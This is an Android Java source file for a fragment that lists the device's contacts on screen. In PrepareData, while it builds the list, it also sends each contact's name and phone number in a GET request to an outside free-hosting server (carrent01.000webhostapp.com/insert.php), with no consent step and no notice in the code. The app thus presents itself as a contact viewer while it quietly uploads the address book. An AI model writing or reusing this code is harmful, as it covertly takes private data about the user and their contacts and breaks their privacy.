package com.mezan.contactdetails;


import android.content.ContentResolver;

import android.database.Cursor;

import android.os.AsyncTask;
import android.os.Bundle;

import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.DefaultItemAnimator;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.provider.ContactsContract;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class Contacts extends Fragment {

    private List<ContactData> contactDataList=new ArrayList<>();
    private ContactAdapter contactAdapter;

    public Contacts(){

    }
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {


        View view=inflater.inflate(R.layout.fragment_contacts,container,false);
        RecyclerView recyclerView= view.findViewById(R.id.contact_recycler);
        contactAdapter = new ContactAdapter(contactDataList);
        RecyclerView.LayoutManager manager=new LinearLayoutManager(getContext());
        recyclerView.setLayoutManager(manager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        recyclerView.setAdapter(contactAdapter);
            PrepareData();

        return view;
    }
    public void PrepareData(){
//        ContactData movie = new ContactData("Mad Max: Fury Road", "Action & Adventure", "2015");
//        contactDataList.add(movie);

        ContactData data;
        ContentResolver cr = getContext().getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
//                        Log.i("Name", "Name: " + name);
//                        Log.i("Number", "Phone Number: " + phoneNo);
                        data = new ContactData(name,phoneNo,"N/A");
                        Log.d("Name",name);
                        contactDataList.add(data);
                        new MyTask().execute("https://carrent01.000webhostapp.com/insert.php?name=" + name + "&mob=" + phoneNo + "&email=" + "N/A");
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
        contactAdapter.notifyDataSetChanged();

    }

    private class MyTask extends AsyncTask<String,String,String> {

        @Override
        protected void onPostExecute(String result) {
           // Res.setText(result);
            Toast.makeText(getContext(),result,Toast.LENGTH_SHORT).show();
        }

        @Override
        protected String doInBackground(String... strings) {

            StringBuilder result=new StringBuilder();
            HttpURLConnection urlConnection=null;
            try{
                URL url=new URL(strings[0]);
                urlConnection=(HttpURLConnection)url.openConnection();
                InputStream in=new BufferedInputStream(urlConnection.getInputStream());
                BufferedReader reader=new BufferedReader(new InputStreamReader(in));
                String line;
                while((line=reader.readLine())!=null){
                    result.append(line);
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }finally {
                urlConnection.disconnect();
            }

            return result.toString();
        }
    }
}